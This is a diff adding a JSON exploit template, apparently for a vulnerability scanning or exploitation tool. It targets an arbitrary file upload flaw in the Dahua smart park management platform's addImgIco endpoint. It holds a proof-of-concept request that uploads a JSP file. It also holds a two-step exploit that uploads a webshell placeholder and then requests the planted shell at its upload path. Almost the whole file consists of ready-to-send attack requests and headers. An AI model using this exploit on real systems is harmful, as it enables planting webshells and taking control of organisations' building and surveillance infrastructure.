@@ -1,0 +1,42 @@
+{
+	"name":"大华智慧园区管理平台addImgIco文件上传",
+	"tag":"dahua",
+	"type":"upload",
+	"poc":{
+		"pocGet":"/emap/devicePoint_addImgIco?hasSubsystem=true",
+		"pocPost":"--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT\r\nContent-Disposition: form-data; name=\"upload\"; filename=\"1.jsp\"\r\nContent-Type: application/octet-stream\r\nContent-Transfer-Encoding: binary\r\n\r\n<%out.println(\"hello\");%>\r\n--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT--",
+		"header":{
+			"Accept":" text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2",
+			"User-Agent":" Java/1.8.0_345",
+			"Connection":" close",
+			"Content-Length":" 241",
+			"Content-Type":" multipart/form-data; boundary=A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT"
+		},
+		"status_code":"200",
+		"pattern":"(ico.*\\.jsp)"
+	},
+	"exp":{
+		"step1":{
+			"expGet":"/emap/devicePoint_addImgIco?hasSubsystem=true",
+			"expPost":"--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT\r\nContent-Disposition: form-data; name=\"upload\"; filename=\"1.jsp\"\r\nContent-Type: application/octet-stream\r\nContent-Transfer-Encoding: binary\r\n\r\n{{webshell}}\r\n--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT--",
+			"header":{
+				"Accept":" text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2",
+				"User-Agent":" Java/1.8.0_345",
+				"Connection":" close",
+				"Content-Length":" 241",
+				"Content-Type":" multipart/form-data; boundary=A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT"
+			},
+			"status_code":"200",
+			"pattern":"(ico.*\\.jsp)"
+		},
+		"step2":{
+			"expGet":"/upload/emap/society_new/{{shellpath}}",
+			"header":{
+				"User-Agent":"Mozilla/5.0 (Linux;",
+				"content-type":"text/plain"
+			},
+			"status_code":"200",
+			"pattern":"()"
+		}
+	}
+}
